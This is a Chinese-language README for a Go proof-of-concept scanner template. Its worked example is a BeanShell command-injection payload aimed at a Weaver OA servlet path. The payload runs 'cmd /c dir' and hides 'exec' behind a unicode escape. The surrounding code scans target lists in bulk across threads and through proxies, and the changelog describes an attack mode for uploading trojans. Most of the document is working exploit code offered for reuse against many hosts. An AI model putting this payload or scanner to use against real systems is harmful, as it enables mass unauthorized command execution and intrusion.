# GO语言版 poc模版

# 2023.10.27更新

增加参数-att,默认为检查，尽可能降低危害，使用参数-att后可进行上传木马等操作

具体代码为attack_from_url，将之前的attack_from_url修改为check_from_url，用来进行默认的无危害检查。

# 2023.5.26更新

使用httpx库替换net/http标准库

## 使用说明

之前写过一个python的poc模版，完成了多线程扫描、单线程扫描，结果输出到文件、代理等功能，而最近在学习go，所以也重新写了一个go语言版的poc模版，同样完成了多线程扫描、单线程扫描、输出到文件、代理等功能。方便大家快速编写自己的poc。

![image-20230130202636364](GO%E8%AF%AD%E8%A8%80%E7%89%88%20poc%E6%A8%A1%E7%89%88.assets/image-20230130202636364.png)

## poc编写

在代码中，大部分功能都无需修改，仅需修改attack_from_url函数即可。

```go
func attack_from_url(target_url *string) string {
	path := "/weaver/bsh.servlet.BshServlet"
	targetUrl := *target_url + path
	body := "bsh.script=ex\\u0065c(\"cmd /c dir\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"
	reader := strings.NewReader(body)
	request, err := http.NewRequest("POST", targetUrl, reader)
	if err != nil {
		panic(err)
	}
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	request.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0")
	client := set_proxy()
	resp, err := client.Do(request)
	if err != nil {
		print.red.Println("[-] " + *target_url + " 访问错误")
	} else {
		bodys, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			panic(err)
		}
		body_data := string(bodys)
		if strings.Contains(body_data, "Program Files") {
			print.green.Println("[+] " + *target_url + " 存在任意命令执行漏洞")
			return *target_url
		} else {
			print.yellow.Println("[-] " + *target_url + " 不存在任意命令执行漏洞")
		}
		defer resp.Body.Close()
	}
	return ""
}
```

代码如上，以某微OA命令执行漏洞为例。首先在第二行设置了攻击的路径path，然后在第4行设置了body，如果为get请求，则删除4、5行以及第六行的reader即可。然后在10-11行设置了请求体。最后在22行对相应包的包体中的内容进行比对，来判定漏洞是否攻击成功。修改别的poc也仅需修改这些即可。

## 使用效果

![](GO%E8%AF%AD%E8%A8%80%E7%89%88%20poc%E6%A8%A1%E7%89%88.assets/image-20230130201639696.png)

## 代码说明

```go
func main() {
	var target_url string
	var target_file string

	poc_name = ""

	set_screen_color()
	print_head()

	app := cli.App{
		Name:  "go poc模版",
		Usage: "一款通用的go语言poc模版",
		Flags: []cli.Flag{
			cli.StringFlag{
				Name:        "target_url,u",
				Usage:       "读取单个目标的`url`",
				Destination: &target_url,
			},
			cli.StringFlag{
				Name:        "target_file,f",
				Usage:       "从`File`读取批量读取URL",
				Destination: &target_file,
			},
			cli.StringFlag{
				Name:        "output,o",
				Usage:       "扫描结果输出到`File`",
				Destination: &output_file,
				Value:       "success.txt",
			},
			cli.StringFlag{
				Name:        "proxy,p",
				Usage:       "代理的`url`地址",
				Destination: &proxy,
			},
			cli.IntFlag{
				Name:        "thread,t",
				Usage:       "批量扫描时的线程`数量`",
				Destination: &threads,
				Value:       20,
			},
		},
		Action: func(c *cli.Context) error {
			if target_url != "" && target_file != "" {
				print.red.Println("[-] 请选择到底是进行单个扫描还是进行批量扫描！")
				os.Exit(0)
			} else if target_url != "" {
				attack_from_url(&target_url)
			} else if target_file != "" {
				attack_from_file(&target_file)
			}
			return nil
		},
	}
	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}
```

首先在main函数中，定义需要的一些变量，设置命令行输出的颜色以及poc头信息，通过cli库来完成命令行操作的内容，然后在用户输入完命令后，进行判断，判断进行单线程扫描还是多线程扫描，如果进行单线程扫描，则直接进入attack_from_url函数对目标进行攻击，如果进行多线程扫描，则进入attack_from_file函数对存放攻击目标的文件进行处理。

```go
func attack_from_file(target_file *string) {
	success_url_list := list.New()
	target_url_lists := read_file(target_file)
	var data string
	string_chan := make(chan string)
	target_chan := make(chan string)
	if target_url_lists.Len() > 0 {
		print.blue.Println("[*] 成功读取目标，共计", target_url_lists.Len(), "个目标")
		for i := 0; i < threads; i++ {
			go attack_from_urls(target_chan, string_chan)
		}
		go func() {
			for i := target_url_lists.Front(); i != nil; i = i.Next() {
				target_url := fmt.Sprintf("%s", i.Value)
				target_chan <- target_url
			}
		}()
		for i := 0; i < target_url_lists.Len(); i++ {
			data = <-string_chan
			if data != "" {
				data = data + "\n"
				success_url_list.PushBack(data)
			}
		}
		close(string_chan)
		close(target_chan)
		write_file(success_url_list)
		print.blue.Println("[*] 共扫描个", target_url_lists.Len(), "目标，存在漏洞目标", success_url_list.Len(), "个。")
		print.blue.Println("[*] 扫描结果已保存到", output_file)
	} else {
		print.red.Println("[-] 未读取到目标，请检查文件中是否存在目标！")
	}
}
```

在attack_from_file文件中，首先创建两个列表，一个用来存放文件中读取出来的攻击目标，一个用来存放攻击成功的目标。然后创建两个管道，用来和子线程进行通信。如果读取到大于0个url，则打印读取的目标数，并根据用户给定的线程数量开启线程。然后另开启一个线程，循环读取列表中存放的攻击目标，并将其输入管道。而后在主线程中开启一个循环，循环利用管道接收线程的攻击结果。最后将结果写入文件。

```
func attack_from_urls(target_chan, string_chan chan string) {
	for target_url := range target_chan {
		data := attack_from_url(&target_url)
		string_chan <- data
	}
}
```

而在上述代码中，我们使用attack_from_urls作为子线程，在该函数中，我们利用for循环从管道中读取目标，并交给attack_from_url函数进行攻击，并将返回的攻击结果通过管道发送回attack_from_file函数中进行接收，并最后写入文件。

整个的代码逻辑还是十分简单，至于颜色和读取文件写入文件等函数，大家可以自行查看，希望可以帮助到大家。